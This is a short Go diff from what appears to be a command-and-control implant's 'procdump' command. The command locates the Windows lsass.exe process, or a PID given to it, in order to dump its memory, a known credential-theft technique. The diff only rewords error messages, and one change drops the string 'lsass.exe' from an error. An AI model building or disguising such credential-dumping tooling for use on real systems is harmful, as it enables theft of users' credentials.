@@ -61,13 +61,13 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	case "lsass":
 		pid, name, err := findProcessByName("lsass.exe")
 		if err != nil {
-			return errorf("Failed to find lsass.exe: %v", err)
+			return errorf("Failed to find target process: %v", err)
 		}
 		targetPID = pid
 		processName = name
 	case "dump":
 		if args.PID <= 0 {
-			return errorResult("Error: -pid is required for dump action")
+			return errorResult("-pid is required for dump action")
 		}
 		targetPID = uint32(args.PID)
 		name, _ := getProcessName(targetPID)
